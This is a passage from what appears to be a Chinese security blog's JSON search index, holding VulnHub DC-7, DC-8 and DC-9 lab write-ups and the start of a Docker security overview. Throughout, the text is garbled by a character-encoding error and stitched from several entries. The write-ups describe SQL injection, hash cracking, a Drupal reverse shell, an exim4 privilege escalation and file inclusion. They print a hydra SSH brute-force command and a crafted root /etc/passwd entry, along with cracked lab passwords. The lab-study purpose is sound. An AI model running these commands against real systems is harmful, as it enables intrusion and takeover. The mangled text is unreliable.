ï¼š\nåœ¨config.phpé‡Œé¢å‘ç°äº†è´¦å¯†ï¼Œè¯•è¯•ç™»å½•drupalå‘¢\nåˆ©ç”¨è´¦å¯†è¿æ¥ssh é”™äº†ï¼Œé‚£è¿˜æœ‰ç™»é™†çš„åœ°æ–¹å°±æ˜¯22ç«¯å£çš„sshæœåŠ¡ï¼Œè¿æ¥è¯•è¯•ï¼š\nè¿™å°±getshelläº†ï¼Ÿ\nshellä¸‹çš„ä¿¡æ¯æœé›† æ­£å¸¸è¿›è¡Œä¿¡æ¯æ”¶é›†ï¼Œçœ‹çœ‹suidã€sudoã€å†…æ ¸ç­‰ï¼š\nç¡®å®æ²¡æœ‰ä»€ä¹ˆåˆ©ç”¨ç‚¹ï¼Œé‚£å¯èƒ½å°±æ˜¯æœ‰ä»€ä¹ˆåˆ©ç”¨æ–‡ä»¶äº†ï¼Œæ‰¾æ‰¾çœ‹ï¼š\nå½“å‰ç›®å½•æœ‰å¤‡ä»½æ–‡ä»¶å¤¹ï¼Œä½†é‡Œé¢æ˜¯åŠ å¯†çš„gpgæ–‡ä»¶ï¼Œè€Œmboxè®°å½•äº†rootçš„å®šæ—¶ä»»åŠ¡ï¼Œè·¯å¾„ä¸º/opt/scripts/backups.shï¼Œè¿‡å»çœ‹çœ‹ï¼š\nåˆ©ç”¨è¿™ä¸ªrootçš„ä»»åŠ¡å¯ä»¥ææƒï¼Œä½†å‘ç°è„šæœ¬åªæœ‰rootå’Œwww-dataå¯å†™ï¼Œå¾—æƒ³åŠæ³•æ‹¿åˆ°www-dataèº«ä»½ï¼Œé‚£å°±å¾—é€šè¿‡webæœåŠ¡æ‹¿shellï¼Œé‚£ä¹ˆå…¥æ‰‹ç‚¹åˆè¦å›åˆ°åå°ï¼Œå…ˆçœ‹çœ‹è„šæœ¬\nè„šæœ¬å†…å®¹ï¼š\n#!/bin/bash # åˆ é™¤ /home/dc7user/backups/ ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ rm /home/dc7user/backups/* # åˆ‡æ¢ç›®å½•åˆ° /var/www/html/ cd /var/www/html/ # ä½¿ç”¨ Drush å·¥å…·å¯¼å‡ºæ•°æ®åº“ï¼Œå¹¶å°†ç»“æœä¿å­˜ä¸º /home/dc7user/backups/website.sql drush sql-dump --result-file=/home/dc7user/backups/website.sql # è¿”å›ä¸Šçº§ç›®å½• cd .. # å°† html/ ç›®å½•çš„å†…å®¹æ‰“åŒ…æˆ website.tar.gz å¹¶ä¿å­˜åœ¨ /home/dc7user/backups/ ç›®å½•ä¸‹ tar -czf /home/dc7user/backups/website.tar.gz html/ # ä½¿ç”¨ GPG å¯¹ /home/dc7user/backups/website.sql æ–‡ä»¶è¿›è¡Œå¯¹ç§°åŠ å¯†ï¼Œå¹¶ç”¨æŒ‡å®šçš„å¯†ç ä¿æŠ¤ gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.sql # ä½¿ç”¨ GPG å¯¹ /home/dc7user/backups/website.tar.gz æ–‡ä»¶è¿›è¡Œå¯¹ç§°åŠ å¯†ï¼Œå¹¶ç”¨æŒ‡å®šçš„å¯†ç ä¿æŠ¤ gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.tar.gz # å°† /home/dc7user/backups/ ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶çš„æ‰€æœ‰è€…æ”¹ä¸º dc7user chown dc7user:dc7user /home/dc7user/backups/* # åˆ é™¤ /home/dc7user/backups/website.sql æ–‡ä»¶ rm /home/dc7user/backups/website.sql # åˆ é™¤ /home/dc7user/backups/website.tar.gz æ–‡ä»¶ rm /home/dc7user/backups/website.tar.gz è¿™é‡Œé‡ç‚¹åœ¨äºdrushï¼Œæ˜¯ä¸€ä¸ªç®€åŒ–äº†åˆ›å»ºå’Œç®¡ç†Drupal8ç½‘ç«™çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œå¯ä»¥ç”¨æ¥ä¿®æ”¹å¯†ç ï¼š\n"
    }
,
    {
        "title": "DC-8æ¸—é€ç¬”è®°",
        "link": "/My-Knowlege-Database/blog/%E6%B8%97%E9%80%8F/%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/vulnhub/dc/dc-8%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/",
        "content": "DC-8æ¸—é€ç¬”è®° é¶åœºæè¿°ï¼š\nä¿¡æ¯æœé›† IPã€ç«¯å£ã€ç½‘é¡µç›®å½•ä¸€æ¡é¾™ï¼š\nIPä¸º192.168.111.191 ç«¯å£å¼€æ”¾äº†22ã€80 ç›®å½•å¯ä»¥çœ‹åˆ°ç™»é™†åå° å†çœ‹çœ‹ç½‘é¡µï¼š è¿™æ¬¡çš„cmsæ˜¯drupal 7\næ¼æ´åˆ©ç”¨ sqlæ³¨å…¥è·å–å¯†ç å“ˆå¸Œ ç¿»ç¿»å„ä¸ªé¡µé¢ï¼š\nå‘ç°æœ‰çš„é¡µé¢æ˜¯ä½¿ç”¨nidå‚æ•°è¿›è¡Œæ§åˆ¶çš„ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰sqlæ³¨å…¥ï¼š\nè¿˜çœŸæœ‰ï¼Œç›´æ¥sqlmapä¸€æŠŠæ¢­ï¼š\nçˆ†åº“åï¼š\nåº“åä¸ºd7db\nçˆ†è¡¨åï¼š 88å¼ è¡¨ï¼Œé‡Œé¢çš„usersè¡¨å€¼å¾—å…³æ³¨\nçˆ†åˆ—åï¼š\n16åˆ—ï¼Œä¸»è¦å…³æ³¨å…¶ä¸­çš„nameå’Œpass\nçˆ†å­—æ®µï¼š\nokæ‹¿åˆ°ä¸¤ç»„å¯†ç å“ˆå¸Œ\njohnç ´è§£å¯†ç å“ˆå¸Œ æŠŠè·å¾—çš„è´¦å¯†å†™å…¥æ–‡æ¡£ï¼š\nç”¨johnè¿›è¡Œæš´åŠ›ç ´è§£ï¼š\nadminçš„å¯†ç æ— æ³•ç ´è§£ä½†johnçš„å¯†ç æ˜¯turtle\nåå°åå¼¹shell ç›´æ¥åœ¨/user/loginç™»å½•ï¼ŒæˆåŠŸï¼Œæ¥ä¸‹æ¥å°±æ˜¯åœ¨åå°çœ‹çœ‹æœ‰æ²¡æœ‰å†™æ–‡ä»¶ä¹‹ç±»èƒ½å¤Ÿç”¨æ¥getshellçš„ç‚¹äº†ï¼š\nå‘ç°ç¡®å®æœ‰ä¸ªå†™phpä»£ç çš„ä½ç½®ï¼Œæ‡’å¾—è¿webshellå†åå¼¹äº†ï¼Œç›´æ¥å†™åå¼¹shellä»£ç ï¼š\nç¡®è®¤é¡µé¢åï¼Œå¡«å†™ä¿¡æ¯ï¼Œå‘é€phpä»£ç ï¼š\næˆåŠŸåå¼¹shellï¼š\npythonè·å–ptyï¼š\nè¿›å…¥ææƒé˜¶æ®µ\næƒé™æå‡ æ¥ä¸‹æ¥å°±æ˜¯é’ˆå¯¹ææƒçš„ä¿¡æ¯æ”¶é›†äº†ï¼Œå‘ç°suidæƒé™çš„é…ç½®æœ‰ç‚¹é—®é¢˜ï¼š\nè¿™ä¸ªexim4æœ‰ç‚¹é—®é¢˜ï¼Œçœ‹çœ‹ï¼š\nå‘ç°è¯¥ç‰ˆæœ¬å­˜åœ¨æƒé™æå‡çš„æ¼æ´\ncpä¸€ä¸‹è„šæœ¬ï¼Œå¹¶ä¸”ç¼–è¾‘æŸ¥çœ‹æ–‡ä»¶ç±»å‹ï¼šset ff=unixï¼Œè¿™æ ·è„šæœ¬æ‰èƒ½å†linuxä¸‹æ‰§è¡Œ\nå°†è¯¥è„šæœ¬ä¸Šä¼ åˆ°é¶æœºä¸Šå¹¶èµ‹äºˆæ‰§è¡Œæƒé™ï¼š\næŒ‰ç…§ä½¿ç”¨æ–¹æ³•æ‰§è¡Œè„šæœ¬ï¼š\nå†åœ¨/rootæ‹¿åˆ°flagï¼š\næ€»ç»“ æœ¬æ¬¡æ¸—é€è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬é‡åˆ°äº†å¦‚ä¸‹æ¼æ´æˆ–åˆ©ç”¨ï¼š\ndrupal 7é¡µé¢idå­˜åœ¨sqlæ³¨å…¥ johnç ´è§£å¯†ç å“ˆå¸Œ åå°contacté¡µé¢èƒ½ä»¥phpä»£ç ç¼–è¾‘ï¼Œå®ç°åå¼¹shell exim4.89 å­˜åœ¨æƒé™æå‡æ¼æ´ ",
        "summary": "DC-8æ¸—é€ç¬”è®° é¶åœºæè¿°ï¼š\nä¿¡æ¯æœé›† IPã€ç«¯å£ã€ç½‘é¡µç›®å½•ä¸€æ¡é¾™ï¼š\nIPä¸º192.168.111.191 ç«¯å£å¼€æ”¾äº†22ã€80 ç›®å½•å¯ä»¥çœ‹åˆ°ç™»é™†åå° å†çœ‹çœ‹ç½‘é¡µï¼š è¿™æ¬¡çš„cmsæ˜¯drupal 7\næ¼æ´åˆ©ç”¨ sqlæ³¨å…¥è·å–å¯†ç å“ˆå¸Œ ç¿»ç¿»å„ä¸ªé¡µé¢ï¼š\nå‘ç°æœ‰çš„é¡µé¢æ˜¯ä½¿ç”¨nidå‚æ•°è¿›è¡Œæ§åˆ¶çš„ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰sqlæ³¨å…¥ï¼š\nè¿˜çœŸæœ‰ï¼Œç›´æ¥sqlmapä¸€æŠŠæ¢­ï¼š\nçˆ†åº“åï¼š\nåº“åä¸ºd7db\nçˆ†è¡¨åï¼š 88å¼ è¡¨ï¼Œé‡Œé¢çš„usersè¡¨å€¼å¾—å…³æ³¨\nçˆ†åˆ—åï¼š\n16åˆ—ï¼Œä¸»è¦å…³æ³¨å…¶ä¸­çš„nameå’Œpass\nçˆ†å­—æ®µï¼š\nokæ‹¿åˆ°ä¸¤ç»„å¯†ç å“ˆå¸Œ\njohnç ´è§£å¯†ç å“ˆå¸Œ æŠŠè·å¾—çš„è´¦å¯†å†™å…¥æ–‡æ¡£ï¼š\nç”¨johnè¿›è¡Œæš´åŠ›ç ´è§£ï¼š\nadminçš„å¯†ç æ— æ³•ç ´è§£ä½†johnçš„å¯†ç æ˜¯turtle\nåå°åå¼¹shell ç›´æ¥åœ¨/user/loginç™»å½•ï¼ŒæˆåŠŸï¼Œæ¥ä¸‹æ¥å°±æ˜¯åœ¨åå°çœ‹çœ‹æœ‰æ²¡æœ‰å†™æ–‡ä»¶ä¹‹ç±»èƒ½å¤Ÿç”¨æ¥getshellçš„ç‚¹äº†ï¼š\nå‘ç°ç¡®å®æœ‰ä¸ªå†™phpä»£ç çš„ä½ç½®ï¼Œæ‡’å¾—è¿webshellå†åå¼¹äº†ï¼Œç›´æ¥å†™åå¼¹shellä»£ç ï¼š\nç¡®è®¤é¡µé¢åï¼Œå¡«å†™ä¿¡æ¯ï¼Œå‘é€phpä»£ç ï¼š\næˆåŠŸåå¼¹shellï¼š\npythonè·å–ptyï¼š\nè¿›å…¥ææƒé˜¶æ®µ\næƒé™æå‡ æ¥ä¸‹æ¥å°±æ˜¯é’ˆå¯¹ææƒçš„ä¿¡æ¯æ”¶é›†äº†ï¼Œå‘ç°suidæƒé™çš„é…ç½®æœ‰ç‚¹é—®é¢˜ï¼š\nè¿™ä¸ªexim4æœ‰ç‚¹é—®é¢˜ï¼Œçœ‹çœ‹ï¼š\nå‘ç°è¯¥ç‰ˆæœ¬å­˜åœ¨æƒé™æå‡çš„æ¼æ´\ncpä¸€ä¸‹è„šæœ¬ï¼Œå¹¶ä¸”ç¼–è¾‘æŸ¥çœ‹æ–‡ä»¶ç±»å‹ï¼šset ff=unixï¼Œè¿™æ ·è„šæœ¬æ‰èƒ½å†linuxä¸‹æ‰§è¡Œ\nå°†è¯¥è„šæœ¬ä¸Šä¼ åˆ°é¶æœºä¸Šå¹¶èµ‹äºˆæ‰§è¡Œæƒé™ï¼š\næŒ‰ç…§ä½¿ç”¨æ–¹æ³•æ‰§è¡Œè„šæœ¬ï¼š\nå†åœ¨/rootæ‹¿åˆ°flagï¼š\næ€»ç»“ æœ¬æ¬¡æ¸—é€è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬é‡åˆ°äº†å¦‚ä¸‹æ¼æ´æˆ–åˆ©ç”¨ï¼š\ndrupal 7é¡µé¢idå­˜åœ¨sqlæ³¨å…¥ johnç ´è§£å¯†ç å“ˆå¸Œ åå°contacté¡µé¢èƒ½ä»¥phpä»£ç ç¼–è¾‘ï¼Œå®ç°åå¼¹shell exim4.89 å­˜åœ¨æƒé™æå‡æ¼æ´ "
    }
,
    {
        "title": "DC-9æ¸—é€ç¬”è®°",
        "link": "/My-Knowlege-Database/blog/%E6%B8%97%E9%80%8F/%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/vulnhub/dc/dc-9%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/",
        "content": "DC-9æ¸—é€ç¬”è®° ä¿¡æ¯æœé›† IPã€ç«¯å£ã€ç›®å½•ä¸€æ¡é¾™ï¼š\nIPä¸º192.168.111.142 ç«¯å£å¼€æ”¾äº†22ã€80 ç›®å½•åªæ‰«åˆ°ä¸€ç‚¹ç‚¹ å†çœ‹çœ‹webé¡µé¢ï¼š\nå¹¶ä¸æ˜¯ä»€ä¹ˆé€šç”¨çš„cmsï¼Œé‚£å°±ä»åŠŸèƒ½ç‚¹å…¥æ‰‹ï¼š æœç´¢åŠŸèƒ½ç‚¹æœ‰ä¸ªè¾“å…¥æ¡†ï¼Œç”¨ä¸‡èƒ½å¯†ç è¯•è¯•ï¼š\nç›´æ¥çˆ†å‡ºäº†æ‰€æœ‰å‘˜å·¥ä¿¡æ¯ï¼š\nå¯çŸ¥è¿™é‡Œæœ‰SQLæ³¨å…¥\næ¼æ´åˆ©ç”¨ sqlæ³¨å…¥ sqlmapè·‘ä¸€ä¸‹\nçˆ†åº“åï¼š\nçˆ†è¡¨åï¼š\næ‰“å°è¡¨ï¼š\nè·å¾—äº†å‘˜å·¥çš„è´¦å¯†ï¼Œä½†æ˜¯æ²¡æœ‰adminï¼Œå†çœ‹çœ‹Staffåº“ï¼š\næœ‰ä¿©è¡¨\nçˆ†ä¿©è¡¨ï¼š\nStaffDetailsï¼š\nUsersï¼š\nå¾—åˆ°äº†adminçš„å¯†ç transorbital1\næ–‡ä»¶åŒ…å« æˆåŠŸç™»å½•ï¼š\næ³¨æ„åˆ°é¡µè„šæœ‰â€œFile does not existâ€ï¼Œä¸€çœ¼å®šçœŸï¼Œå­˜åœ¨æ–‡ä»¶åŒ…å«ï¼Œä¹‹å‰DCä¹Ÿé‡åˆ°è¿‡ï¼ŒçŒœçŒœå‚æ•°ï¼š\nå“ˆå“ˆè¿˜çœŸæ˜¯\næ¥ä¸‹æ¥æœ¬æ¥æƒ³å°è¯•åŒ…å«æ—¥å¿—æ–‡ä»¶å†™é©¬çš„ï¼Œä½†æ˜¯æ²¡æœ‰è¯•å‡ºæ—¥å¿—æ–‡ä»¶è·¯å¾„ã€‚ã€‚ã€‚\né‚£ä¹ˆå¦‚ä½•getshellï¼Ÿæˆ‘ä»¬åŒ…å«çš„æ—¶å€™å¯è§passwdæ–‡ä»¶æœ‰å¾ˆå¤šç”¨æˆ·ï¼Œå’Œæ•°æ®åº“ä¸­ç”¨æˆ·ä¸€è‡´ï¼Œæ‰€ä»¥å¯ä»¥å°è¯•ä¸€ä¸‹sshçˆ†ç ´ï¼š\nhydra -L name.txt -P pass.txt ssh://192.168.111.142 ä¸è¡Œï¼Œæ‹’ç»è¿æ¥ï¼Œè¿™é‡Œåº”è¯¥æ˜¯å­˜åœ¨æ•²é—¨æœåŠ¡ï¼š\nå­˜åœ¨knockdæœåŠ¡ã€‚ è¯¥æœåŠ¡é€šè¿‡åŠ¨æ€çš„æ·»åŠ iptablesè§„åˆ™æ¥éšè—ç³»ç»Ÿå¼€å¯çš„æœåŠ¡ï¼Œä½¿ç”¨è‡ªå®šä¹‰çš„ä¸€ç³»åˆ—åºåˆ—å·æ¥\u0026quot;æ•²é—¨\u0026quot;ï¼Œä½¿ç³»ç»Ÿå¼€å¯éœ€è¦è®¿é—®çš„æœåŠ¡ç«¯å£ï¼Œæ‰èƒ½å¯¹å¤–è®¿é—®ã€‚ ä¸ä½¿ç”¨æ—¶ï¼Œå†ä½¿ç”¨è‡ªå®šä¹‰çš„åºåˆ—å·æ¥\u0026quot;å…³é—¨\u0026quot;ï¼Œå°†ç«¯å£å…³é—­ï¼Œä¸å¯¹å¤–ç›‘å¬ã€‚è¿›ä¸€æ­¥æå‡äº†æœåŠ¡å’Œç³»ç»Ÿçš„å®‰å…¨ //é…ç½®æ–‡ä»¶è·¯å¾„ é»˜è®¤é…ç½®æ–‡ä»¶æ˜¯ï¼š/etc/knockd.conf\næ‰€ä»¥å…ˆåŒ…å«ä¸€ä¸‹é…ç½®æ–‡ä»¶çœ‹çœ‹ï¼š\næ‰€ä»¥è¦ä¾æ¬¡å¯¹7469ã€8475ã€9842æ•²é—¨ï¼Œå†è¿æ¥sshæœåŠ¡ï¼š\næ•²é—¨ï¼š\nå¯ä»¥çœ‹è§sshå·²å¼€å¯ï¼š\næ¥ä¸‹æ¥å†sshçˆ†ç ´ï¼š\nè·å¾—äº†ä¸‰ç»„è´¦æˆ·\nsshè¿æ¥ ä¸‰ç»„ç”¨æˆ·éƒ½ç™»é™†è¯•è¯•ï¼Œæœ€åå‘ç°janitorçš„ä¸ªäººç›®å½•ä¸‹æœ‰ä¸€ä¸ªç›®å½•ï¼Œçœ‹çœ‹ï¼š\nå‘ç°å‡ ä¸ªå¯†ç ï¼Œæ·»åŠ åˆ°åŸæœ¬çš„å¯†ç å­—å…¸å†sshçˆ†ç ´ä¸€æ¬¡ï¼š\nå‘ç°å¤šçˆ†å‡ºä¸€ä¸ªfredfç”¨æˆ·ï¼Œç™»å½•\næƒé™æå‡ ä¿¡æ¯æœé›†ä¸€ä¸‹\nå‘ç°æœ‰ä¸ªå…å¯†sudoï¼Œçœ‹çœ‹æƒé™\nå¯æ‰§è¡Œï¼Œå†çœ‹çœ‹å…¶ä»–çš„\nåœ¨/opt/devstuffç›®å½•ä¸‹å‘ç°äº†ä¸€ä¸ªtest.pyè„šæœ¬æ–‡ä»¶ï¼Œå¯ä»¥ç”¨æ¥å†™æ–‡ä»¶ï¼Œå¹¶ä¸”å‚æ•°å¯æ§\né‚£ä¹ˆå°±æ˜¯ä¸€ä¸ªå¾ˆç»å…¸çš„sudoææƒæ€è·¯ï¼šæ„é€ ä¸€ä¸ªæ‹¥æœ‰rootæƒé™çš„ç”¨æˆ·ï¼Œå¹¶ä¸”é€šè¿‡è„šæœ¬å†™å…¥/etc/passwdæ–‡ä»¶ä¸­ï¼Œå³å¯ç™»å½•\né¦–å…ˆæ„é€ ä¸€ä¸ªYuy0ungç”¨æˆ·çš„èº«ä»½ä¿¡æ¯ï¼š\nopenssl passwd -1 -salt Yuy0ung Yuy0ung //-1ä¸ºMD5åŠ å¯†ç®—æ³•ï¼Œ-saltæŒ‡å®šç›å€¼ï¼Œåé¢ä¸ºå¯†ç  æ„é€ å‡ºæ¥ï¼š\nYuy0ung:$1$Yuy0ung$9ETRQ.9iG7QgQQBI3xKu11:0:0:hack:/root:/bin/bash æŠŠæ„é€ å¥½çš„å­—ç¬¦ä¸²å†™å…¥æ–‡ä»¶ï¼š\nè¿è¡Œè„šæœ¬å†™å…¥/etc/passwdï¼š\nç›´æ¥suåˆ‡æ¢åˆ°Yuy0ungç”¨æˆ·ï¼š\næˆåŠŸææƒåˆ°root\nåœ¨/rootç›®å½•ä¸­æ‹¿åˆ°äº†flagï¼š\næ€»ç»“ æœ¬æ¬¡æ¸—é€è¿‡ç¨‹ä¸­ï¼Œé‡åˆ°äº†ä»¥ä¸‹æ¼æ´æˆ–åˆ©ç”¨ï¼š\nç½‘ç«™æœç´¢æ¡†å­˜åœ¨sqlæ³¨å…¥ ç½‘é¡µåå°å­˜åœ¨æ–‡ä»¶åŒ…å« æ•²é—¨å¼€å¯sshæœåŠ¡ sudoè„šæœ¬å‚æ•°åˆ©ç”¨å®ç°æ–°å¢rootç”¨æˆ·ææƒ ",
        "summary": "DC-9æ¸—é€ç¬”è®° ä¿¡æ¯æœé›† IPã€ç«¯å£ã€ç›®å½•ä¸€æ¡é¾™ï¼š\nIPä¸º192.168.111.142 ç«¯å£å¼€æ”¾äº†22ã€80 ç›®å½•åªæ‰«åˆ°ä¸€ç‚¹ç‚¹ å†çœ‹çœ‹webé¡µé¢ï¼š\nå¹¶ä¸æ˜¯ä»€ä¹ˆé€šç”¨çš„cmsï¼Œé‚£å°±ä»åŠŸèƒ½ç‚¹å…¥æ‰‹ï¼š æœç´¢åŠŸèƒ½ç‚¹æœ‰ä¸ªè¾“å…¥æ¡†ï¼Œç”¨ä¸‡èƒ½å¯†ç è¯•è¯•ï¼š\nç›´æ¥çˆ†å‡ºäº†æ‰€æœ‰å‘˜å·¥ä¿¡æ¯ï¼š\nå¯çŸ¥è¿™é‡Œæœ‰SQLæ³¨å…¥\næ¼æ´åˆ©ç”¨ sqlæ³¨å…¥ sqlmapè·‘ä¸€ä¸‹\nçˆ†åº“åï¼š\nçˆ†è¡¨åï¼š\næ‰“å°è¡¨ï¼š\nè·å¾—äº†å‘˜å·¥çš„è´¦å¯†ï¼Œä½†æ˜¯æ²¡æœ‰adminï¼Œå†çœ‹çœ‹Staffåº“ï¼š\næœ‰ä¿©è¡¨\nçˆ†ä¿©è¡¨ï¼š\nStaffDetailsï¼š\nUsersï¼š\nå¾—åˆ°äº†adminçš„å¯†ç transorbital1\næ–‡ä»¶åŒ…å« æˆåŠŸç™»å½•ï¼š\næ³¨æ„åˆ°é¡µè„šæœ‰â€œFile does not existâ€ï¼Œä¸€çœ¼å®šçœŸï¼Œå­˜åœ¨æ–‡ä»¶åŒ…å«ï¼Œä¹‹å‰DCä¹Ÿé‡åˆ°è¿‡ï¼ŒçŒœçŒœå‚æ•°ï¼š\nå“ˆå“ˆè¿˜çœŸæ˜¯\næ¥ä¸‹æ¥æœ¬æ¥æƒ³å°è¯•åŒ…å«æ—¥å¿—æ–‡ä»¶å†™é©¬çš„ï¼Œä½†æ˜¯æ²¡æœ‰è¯•å‡ºæ—¥å¿—æ–‡ä»¶è·¯å¾„ã€‚ã€‚ã€‚\né‚£ä¹ˆå¦‚ä½•getshellï¼Ÿæˆ‘ä»¬åŒ…å«çš„æ—¶å€™å¯è§passwdæ–‡ä»¶æœ‰å¾ˆå¤šç”¨æˆ·ï¼Œå’Œæ•°æ®åº“ä¸­ç”¨æˆ·ä¸€è‡´ï¼Œæ‰€ä»¥å¯ä»¥å°è¯•ä¸€ä¸‹sshçˆ†ç ´ï¼š\nhydra -L name.txt -P pass.txt ssh://192.168.111.142 ä¸è¡Œï¼Œæ‹’ç»è¿æ¥ï¼Œè¿™é‡Œåº”è¯¥æ˜¯å­˜åœ¨æ•²é—¨æœåŠ¡ï¼š\nå­˜åœ¨knockdæœåŠ¡ã€‚ è¯¥æœåŠ¡é€šè¿‡åŠ¨æ€çš„æ·»åŠ iptablesè§„åˆ™æ¥éšè—ç³»ç»Ÿå¼€å¯çš„æœåŠ¡ï¼Œä½¿ç”¨è‡ªå®šä¹‰çš„ä¸€ç³»åˆ—åºåˆ—å·æ¥\u0026quot;æ•²é—¨\u0026quot;ï¼Œä½¿ç³»ç»Ÿå¼€å¯éœ€è¦è®¿é—®çš„æœåŠ¡ç«¯å£ï¼Œæ‰èƒ½å¯¹å¤–è®¿é—®ã€‚ ä¸ä½¿ç”¨æ—¶ï¼Œå†ä½¿ç”¨è‡ªå®šä¹‰çš„åºåˆ—å·æ¥\u0026quot;å…³é—¨\u0026quot;ï¼Œå°†ç«¯å£å…³é—­ï¼Œä¸å¯¹å¤–ç›‘å¬ã€‚è¿›ä¸€æ­¥æå‡äº†æœåŠ¡å’Œç³»ç»Ÿçš„å®‰å…¨ //é…ç½®æ–‡ä»¶è·¯å¾„ é»˜è®¤é…ç½®æ–‡ä»¶æ˜¯ï¼š/etc/knockd.conf\næ‰€ä»¥å…ˆåŒ…å«ä¸€ä¸‹é…ç½®æ–‡ä»¶çœ‹çœ‹ï¼š\næ‰€ä»¥è¦ä¾æ¬¡å¯¹7469ã€8475ã€9842æ•²é—¨ï¼Œå†è¿æ¥sshæœåŠ¡ï¼š\næ•²é—¨ï¼š\nå¯ä»¥çœ‹è§sshå·²å¼€å¯ï¼š\næ¥ä¸‹æ¥å†sshçˆ†ç ´ï¼š\nè·å¾—äº†ä¸‰ç»„è´¦æˆ·\nsshè¿æ¥ ä¸‰ç»„ç”¨æˆ·éƒ½ç™»é™†è¯•è¯•ï¼Œæœ€åå‘ç°janitorçš„ä¸ªäººç›®å½•ä¸‹æœ‰ä¸€ä¸ªç›®å½•ï¼Œçœ‹çœ‹ï¼š\n"
    }
,
    {
        "title": "Dockerå®‰å…¨æ¦‚è§ˆ",
        "link": "/My-Knowlege-Database/blog/%E4%BA%91%E5%AE%89%E5%85%A8/docker%E5%AE%89%E5%85%A8/docker%E5%AE%89%E5%85%A8%E6%A6%82%E8%A7%88/",
        "content": "Dockerå®‰å…¨æ¦‚è§ˆ å‰é¢çš„æ–‡ç« å·²ç»ç®€å•ä»‹ç»äº†dockerå®¹å™¨ç›¸å…³æ¦‚å¿µï¼Œdockerçš„ä½¿ç”¨å¯¹äºæ¥è§¦è¿‡ctfå‡ºé¢˜çš„äººæ¥è¯´è¿˜æ˜¯ç›¸å¯¹ç†Ÿæ‚‰äº†ï¼Œè¿™é‡Œä¹Ÿä¸åšè¿‡å¤šä»‹ç»ï¼Œæ¥ä¸‹æ¥ä»å®‰å…¨çš„è§’åº¦æ¥åˆ†æä¸€ä¸‹docker\nDockeré¢ä¸´çš„é£é™© é•œåƒé£é™© é•œåƒçš„å†…å®¹æ˜¯ç”±ç”¨æˆ·è¿›è¡Œé…ç½®çš„ï¼Œæ‰€ä»¥æœ‰å¯èƒ½é€ æˆä¸€äº›å®‰å…¨é—®é¢˜\nä¸å®‰å…¨çš„ç¬¬ä¸‰æ–¹ç»„ä»¶ æ¯”å¦‚åœ¨é•œåƒä¸­å¼•å…¥äº†ä¸€äº›å…·æœ‰ä¸¥é‡ndayçš„ç»„ä»¶ï¼Œæ¯«æ— ç–‘é—®ï¼Œè¿™ä¸ªé•œåƒä¹Ÿå°±å­˜åœ¨æ¼æ´äº†\nä¸å®‰å…¨çš„é•œåƒ ç±»ä¼¼ä¾›åº”é“¾æ”»å‡»ï¼Œåœ¨å…¬å…±é•œåƒä»“åº“æ¯”å¦‚ Docker Hub é‡Œï¼Œä¼šå­˜åœ¨ä¸€äº›æœ‰æ¼æ´çš„é•œåƒæˆ–è€…æ¶æ„é•œåƒï¼Œå¦‚æœä½¿ç”¨äº†è¿™äº›é•œåƒé‚£å°±å­˜åœ¨é£é™©äº†\næ•æ„Ÿä¿¡æ¯æ³„æ¼ å¦‚æœåœ¨é•œåƒå¼€å‘å®Œæ¯•åæ²¡æœ‰åˆ é™¤è‡ªå·±é…ç½®çš„api keyã€AK/SKç­‰ï¼Œé‚£ä¹ˆå¦‚æœåˆ«äººè·å–åˆ°è¯¥é•œåƒå°±å¯èƒ½é€ æˆæ•æ„Ÿä¿¡æ¯æ³„æ¼\næ´»åŠ¨ä¸­çš„å®¹å™¨é£é™© å®¹å™¨åœ¨è¿è¡Œæ—¶ä¹Ÿæœ‰ä¸€äº›èƒ½å¤Ÿç”¨æˆ·è‡ªå®šä¹‰çš„é…ç½®ï¼Œè¿™äº›é…ç½®ä¸å½“åŒæ ·å¯èƒ½é€ æˆé£é™©\nä¸å®‰å…¨çš„å®¹å™¨åº”ç”¨ æ¯”å¦‚æ˜ å°„å‡ºæ¥çš„ç«¯å£çš„æœåŠ¡å­˜åœ¨æ¼æ´ï¼Œé‚£ä¹ˆè‡ªç„¶ä¼šå¯¼è‡´é£é™©\nä¸å—é™åˆ¶çš„èµ„æºå…±äº« å®¹å™¨è¿è¡Œåœ¨å®¿ä¸»æœºä¸Šï¼Œå®¹å™¨å¿…ç„¶è¦ä½¿ç”¨å®¿ä¸»æœºçš„å„ç§ CPUã€å†…å­˜ç­‰èµ„æºï¼Œå¦‚æœæ²¡æœ‰å¯¹å®¹å™¨è¿›è¡Œèµ„æºä½¿ç”¨é™åˆ¶ï¼Œé‚£ä¹ˆå°±å­˜åœ¨å®¿ä¸»æœºè¢«èµ„æºè€—å°½çš„é£é™©\nä¸å®‰å…¨çš„é…ç½®/æŒ‚è½½ æ­£å¸¸æ¥è¯´ï¼Œå®¹å™¨æœ‰ä¸¤å¤§éš”ç¦»æœºåˆ¶ï¼š\nlinuxå‘½åç©ºé—´ï¼šå®ç°æ–‡ä»¶ç³»ç»Ÿã€ç½‘ç»œã€è¿›ç¨‹ã€ä¸»æœºåç­‰æ–¹é¢çš„éš”ç¦» linuxæ§åˆ¶ç»„ï¼šå®ç°CPUã€å†…å­˜ã€ç¡¬ç›˜ç­‰æ–¹é¢çš„éš”ç¦» è€Œé…ç½®ä¸å½“ä¼šå¯¼è‡´å®¹å™¨æœ¬èº«éš”ç¦»æœºåˆ¶å¤±æ•ˆï¼š\n\u0026ndash;privilegedï¼šä½¿å®¹å™¨å†…çš„ root æƒé™å’Œå®¿ä¸»æœºä¸Šçš„ root æƒé™ä¸€è‡´ï¼Œæƒé™éš”ç¦»è¢«æ‰“ç ´ \u0026ndash;net=hostï¼šä½¿å®¹å™¨ä¸å®¿ä¸»æœºå¤„äºåŒä¸€ç½‘ç»œå‘½åç©ºé—´ï¼Œç½‘ç»œéš”ç¦»è¢«æ‰“ç ´ 